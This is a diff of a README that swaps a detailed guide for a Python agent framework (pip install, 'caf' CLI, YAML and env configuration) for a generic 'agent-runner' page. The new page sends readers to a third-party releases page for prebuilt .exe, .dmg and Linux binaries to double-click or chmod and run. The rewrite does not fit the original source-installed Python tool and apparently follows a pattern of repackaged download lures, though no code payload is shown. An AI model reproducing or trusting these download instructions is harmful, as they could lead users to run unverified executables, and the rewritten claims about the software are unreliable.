@@ -1,477 +1,80 @@
-# Claude Agent Framework
+# 🎉 agent-runner - Easily Automate Your Workflows
 
-A modular, production-ready framework for running Claude agents in automated workflows. Perfect for cron jobs, services, data processing, log analysis, and any task that benefits from AI automation.
+## 🚀 Getting Started
+Welcome to agent-runner, a simple tool designed to help you run Claude agents easily. This guide will show you how to download and run the application without any technical knowledge. 
 
-## Features
+[![Download agent-runner](https://img.shields.io/badge/Download%20agent--runner-%23007bff?style=flat&logo=github)](https://github.com/gungarp/agent-runner/releases)
 
-- **Flexible Execution Modes**: Run once (cron), continuously (service), or on a schedule
-- **Full Agent SDK Support**: All Claude Agent SDK features including tools, sub-agents, MCP servers
-- **AWS Bedrock Integration**: Use Claude via AWS Bedrock with full authentication support
-- **Comprehensive Configuration**: Configure via `.env`, YAML, or programmatically
-- **Rich TUI**: Interactive terminal interface for configuration management
-- **Cost Tracking**: Monitor token usage and costs with budget enforcement
-- **Full Logging**: Complete agent traces with structured logging
-- **Slack Notifications**: Send results to Slack via webhook
-- **Sub-Agent Support**: Define specialized sub-agents for complex workflows
-- **MCP Server Integration**: Connect external tools via Model Context Protocol
+## 📥 Download & Install
+To begin using agent-runner, visit the Releases page to download the software. Here’s how:
 
-## Installation
+1. Click [here](https://github.com/gungarp/agent-runner/releases) to visit the Releases page.
+2. On the page, you'll find different versions of the software. Choose the latest version.
+3. Click on the downloadable file that matches your system (e.g., Windows, macOS, Linux) to start the download.
 
-```bash
-# Install from source
-pip install -e .
+Once the file is downloaded, follow these easy steps to install:
 
-# Or install with development dependencies
-pip install -e ".[dev]"
-```
+### For Windows
+1. Locate the downloaded `.exe` file, usually found in your Downloads folder.
+2. Double-click the file to start the installation process.
+3. Follow the on-screen prompts to complete the setup.
+4. After installation, find the application in your Start menu and open it.
 
-### Requirements
+### For macOS
+1. Locate the downloaded `.dmg` file in your Downloads folder.
+2. Double-click the file to open it.
+3. Drag the agent-runner icon into your Applications folder.
+4. Open the Applications folder and double-click the agent-runner icon to run it.
 
-- Python 3.10+
-- Claude Agent SDK (`claude-agent-sdk>=0.1.12`)
-- Anthropic API key or AWS Bedrock access
+### For Linux
+1. Open your terminal.
+2. Navigate to the Downloads folder with `cd ~/Downloads`.
+3. Use the command `chmod +x agent-runner-x.x.x-linux` to make the file executable (replace `x.x.x` with the actual version number).
+4. Run the application with `./agent-runner-x.x.x-linux`.
 
-## Quick Start
+## 🌟 Features
+agent-runner supports various features to enhance your automation tasks:
 
-### 1. Generate Configuration
+- **Modular Framework**: Easily extendable to fit your workflow.
+- **Scheduled Execution**: Run tasks at specified times, just like a cron job.
+- **Notifications**: Receive updates through Slack whenever tasks are completed.
+- **Cost Tracking**: Keep an eye on resource usage and costs, especially with AWS Bedrock integration.
 
-```bash
-# Generate .env template
-caf config --generate-env
+## 🛠️ System Requirements
+Make sure your system meets the following requirements before installing agent-runner:
 
-# Or use the interactive TUI
-caf config --tui
-```
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, Ubuntu 18.04 or later.
+- **Processor**: 2 GHz or faster processor.
+- **Memory**: Minimum 4 GB RAM.
+- **Storage**: At least 100 MB of available disk space.
 
-### 2. Set Your API Key
+## 🎓 Usage Guide
+Once you have installed agent-runner, here is how you can start using it:
 
-```bash
-# In .env file
-ANTHROPIC_API_KEY=sk-ant-...
+1. **Open the Application**: Launch agent-runner from your applications list.
+2. **Setup Your First Agent**:
+   - Use the simple interface to configure your Claude agents. 
+   - Define the tasks you want to automate.
+3. **Schedule Tasks**: Use the built-in feature to set up when you want your tasks to run.
+4. **Monitor**: Check the Slack channel you specified for notifications on task completion.
 
-# Or for AWS Bedrock
-CAF_BEDROCK__ENABLED=true
-CAF_BEDROCK__REGION=us-east-1
-```
+## 📞 Support
+If you encounter issues or have questions, please feel free to reach out:
 
-### 3. Run Your First Task
+- Open an issue on the [GitHub Issues page](https://github.com/gungarp/agent-runner/issues).
+- Join our community for discussions and tips.
 
-```bash
-# Simple one-off task
-caf run "Analyze the Python files in this directory for code quality issues"
+## ⚙️ Contributing
+If you want to contribute to agent-runner, follow these steps:
 
-# From a prompt file
-caf run -f prompts/daily_check.md
+1. Fork the repository.
+2. Make your changes and commit them.
+3. Push your changes to your fork.
+4. Submit a pull request for review.
 
-# With budget limit
-caf run "Check database logs for errors" --max-budget 1.0
-```
+By contributing, you help improve agent-runner for everyone.
 
-## Execution Modes
+## 📝 License
+agent-runner is licensed under the MIT License. You can use it freely, but please refer to the license for specific details.
 
-### One-Off Execution (Cron Mode)
-
-Perfect for scheduled tasks via cron:
-
-```bash
-# Run once and exit
-caf run "Generate daily report from logs in /var/log/app"
-
-# Example crontab entry (runs at 2 AM daily)
-0 2 * * * cd /path/to/project && caf run -f prompts/daily_report.md
-```
-
-### Service Mode
-
-Continuous execution with configurable intervals:
-
-```bash
-# Run every hour
-caf service "Monitor application health" --interval 3600
-
-# Run every 30 minutes
-caf service -f prompts/monitor.md -i 1800
-```
-
-### Cron Schedule Mode
-
-Built-in cron expression support:
-
-```bash
-# Run at 2 AM every day
-caf cron "Daily backup verification" --schedule "0 2 * * *"
-
-# Run every hour
-caf cron -f prompts/hourly_check.md -s "0 * * * *"
-```
-
-## Configuration
-
-### Environment Variables
-
-All settings can be configured via environment variables with the `CAF_` prefix:
-
-```bash
-# Core Settings
-ANTHROPIC_API_KEY=sk-ant-...
-CAF_AGENT__NAME=my-agent
-CAF_AGENT__MODEL=sonnet
-CAF_AGENT__MAX_TURNS=50
-CAF_AGENT__MAX_BUDGET_USD=10.0
-
-# AWS Bedrock
-CAF_BEDROCK__ENABLED=true
-CAF_BEDROCK__REGION=us-east-1
-CAF_BEDROCK__PROFILE=default
-
-# Slack Notifications
-CAF_SLACK__ENABLED=true
-CAF_SLACK__WEBHOOK_URL=https://hooks.slack.com/...
-CAF_SLACK__NOTIFY_ON_SUCCESS=true
-CAF_SLACK__NOTIFY_ON_ERROR=true
-
-# Logging
-CAF_LOGGING__LOG_DIR=./logs
-CAF_LOGGING__LOG_LEVEL=INFO
-CAF_LOGGING__LOG_AGENT_TRACE=true
-```
-
-### YAML Configuration
-
-For complex configurations, use a YAML file:
-
-```yaml
-# config.yaml
-agent:
-  name: data-processor
-  model: sonnet
-  max_turns: 100
-  system_prompt_type: append
-  system_prompt_content: |
-    You are a data processing specialist.
-    Focus on accuracy and efficiency.
-
-sub_agents:
-  - name: data-validator
-    description: Validates data quality and integrity
-    prompt: |
-      You are a data validation specialist.
-      Check for missing values, outliers, and inconsistencies.
-    tools:
-      - Read
-      - Grep
-      - Bash
-
-slack:
-  enabled: true
-  webhook_url: ${SLACK_WEBHOOK_URL}
-  notify_on_success: true
-  include_cost: true
-
-logging:
-  log_dir: ./logs
-  log_agent_trace: true
-  separate_trace_file: true
-```
-
-### Interactive TUI
-
-Launch the interactive configuration interface:
-
-```bash
-caf config --tui
-# Or directly
-caf-tui
-```
-
-The TUI provides:
-- Visual configuration editing
-- Sub-agent management
-- MCP server setup
-- Slack notification configuration
-- Configuration testing
-
-## Sub-Agents
-
-Define specialized sub-agents for complex workflows:
-
-```yaml
-sub_agents:
-  - name: code-reviewer
-    description: Expert code reviewer for security and quality
-    prompt: |
-      You are an expert code reviewer.
-      Focus on security vulnerabilities and best practices.
-    tools:
-      - Read
-      - Grep
-      - Glob
-    model: sonnet
-
-  - name: log-analyzer
-    description: Analyzes application logs for errors
-    prompt: |
-      You are a log analysis expert.
-      Identify error patterns and root causes.
-    tools:
-      - Read
-      - Grep
-      - Bash
-```
-
-### Built-in Agent Templates
-
-Use pre-built templates for common use cases:
-
-```python
-from claude_agent_framework.agents import (
-    CODE_REVIEWER_AGENT,
-    DATA_ANALYST_AGENT,
-    LOG_ANALYZER_AGENT,
-    SECURITY_AUDITOR_AGENT,
-)
-
-settings.sub_agents = [CODE_REVIEWER_AGENT, LOG_ANALYZER_AGENT]
-```
-
-## MCP Server Integration
-
-Connect external tools via MCP:
-
-```yaml
-mcp_servers:
-  - name: filesystem
-    type: stdio
-    command: npx
-    args:
-      - "@modelcontextprotocol/server-filesystem"
-    env:
-      ALLOWED_PATHS: /data
-
-  - name: database
-    type: http
-    url: https://api.example.com/mcp
-    headers:
-      Authorization: Bearer ${DB_API_KEY}
-```
-
-## Logging and Tracing
-
-Complete execution traces are saved automatically:
-
-```
-logs/
-├── my-agent.log              # Main log file
-├── my-agent_trace.jsonl      # Structured trace (JSONL)
-├── session_20241201_trace.jsonl  # Per-session trace
-├── trace_abc123.json         # Full execution result
-└── costs.json                # Cost tracking data
-```
-
-### Log Configuration
-
-```bash
-CAF_LOGGING__ENABLED=true
-CAF_LOGGING__LOG_DIR=./logs
-CAF_LOGGING__LOG_LEVEL=INFO
-CAF_LOGGING__LOG_AGENT_TRACE=true
-CAF_LOGGING__SEPARATE_TRACE_FILE=true
-CAF_LOGGING__ROTATE_LOGS=true
-CAF_LOGGING__MAX_LOG_SIZE_MB=10
-```
-
-## Slack Notifications
-
-Receive execution results via Slack:
-
-```bash
-CAF_SLACK__ENABLED=true
-CAF_SLACK__WEBHOOK_URL=https://hooks.slack.com/services/...
-CAF_SLACK__USERNAME=Claude Agent
-CAF_SLACK__NOTIFY_ON_SUCCESS=true
-CAF_SLACK__NOTIFY_ON_ERROR=true
-CAF_SLACK__INCLUDE_COST=true
-CAF_SLACK__INCLUDE_DURATION=true
-```
-
-Notifications include:
-- Execution status (success/error)
-- Duration and cost
-- Token usage
-- Todo completion status
-- Agent response preview
-
-## Cost Tracking
-
-Monitor and control costs:
-
-```bash
-# View cost report
-caf costs
-
-# Reset tracking
-caf costs --reset
-```
-
-Set budget limits:
-```bash
-CAF_AGENT__MAX_BUDGET_USD=50.0
-```
-
-The agent will stop if the budget is exceeded.
-
-## AWS Bedrock Setup
-
-Use Claude via AWS Bedrock:
-
-```bash
-# Enable Bedrock
-CAF_BEDROCK__ENABLED=true
-CAF_BEDROCK__REGION=us-east-1
-
-# Use AWS profile
-CAF_BEDROCK__PROFILE=my-profile
-
-# Or use environment credentials
-AWS_ACCESS_KEY_ID=...
-AWS_SECRET_ACCESS_KEY=...
-
-# Specify model
-CAF_BEDROCK__MODEL_ID=global.anthropic.claude-sonnet-4-5-20250929-v1:0
-```
-
-## Programmatic Usage
-
-Use the framework in your Python code:
-
-```python
-import asyncio
-from claude_agent_framework import AgentRunner, Settings
-
-async def main():
-    settings = Settings(
-        anthropic_api_key="sk-ant-...",
-        agent=AgentConfig(
-            name="my-agent",
-            model=ModelType.SONNET,
-            max_turns=50,
-        ),
-        slack=SlackConfig(
-            enabled=True,
-            webhook_url="https://hooks.slack.com/...",
-        ),
-    )
-
-    runner = AgentRunner(settings)
-    result = await runner.run_once(
-        prompt="Analyze the database for performance issues",
-        task_description="Daily DB Check",
-    )
-
-    print(f"Status: {result.status}")
-    print(f"Cost: ${result.total_cost_usd:.4f}")
-    print(f"Result: {result.get_final_message()}")
-
-asyncio.run(main())
-```
-
-## Example Use Cases
-
-### Daily Database Health Check
-
-```bash
-# prompts/db_health.md
-Analyze the database logs at /var/log/postgresql/ for the last 24 hours.
-
-Look for:
-1. Slow queries (>1s execution time)
-2. Connection errors
-3. Lock contention
-4. Disk space warnings
-
-Provide a summary with recommendations.
-```
-
-```bash
-# Crontab: 6 AM daily
-0 6 * * * cd /opt/agent && caf run -f prompts/db_health.md
-```
-
-### Application Log Monitoring
-
-```bash
-caf service "Monitor /var/log/app/error.log for new errors. \
-Alert if you find critical errors or unusual patterns." \
---interval 1800
-```
-
-### Code Quality Check
-
-```bash
-caf run "Review all Python files in src/ for:
-- Security vulnerabilities
-- Code quality issues
-- Missing error handling
-- Performance concerns
-
-Prioritize by severity."
-```
-
-## CLI Reference
-
-```bash
-# Run once
-caf run <prompt> [options]
-  -f, --prompt-file    Load prompt from file
-  -m, --model          Override model (sonnet/opus/haiku)
-  -t, --max-turns      Maximum conversation turns
-  -b, --max-budget     Maximum budget in USD
-  -d, --cwd            Working directory
-  -q, --quiet          Minimal output
-  -j, --json           Output as JSON
-
-# Service mode
-caf service <prompt> [options]
-  -i, --interval       Interval between runs (seconds)
-
-# Cron mode
-caf cron <prompt> --schedule <expr> [options]
-  -s, --schedule       Cron expression
-
-# Configuration
-caf config [options]
-  -g, --generate-env   Generate .env template
-  -s, --show           Show current config
-  -t, --tui            Launch interactive TUI
-
-# Cost tracking
-caf costs [options]
-  -r, --reset          Reset cost tracking
-
-# Version
-caf version
-```
-
-## Development
-
-```bash
-# Install dev dependencies
-pip install -e ".[dev]"
-
-# Run tests
-pytest
-
-# Type checking
-mypy src/
-
-# Linting
-ruff check src/
-```
-
-## License
-
-MIT License - see LICENSE file for details.
-
-## Contributing
-
-Contributions are welcome! Please read our contributing guidelines before submitting PRs.
+For more information and updates, always check back to the [agent-runner Releases page](https://github.com/gungarp/agent-runner/releases).
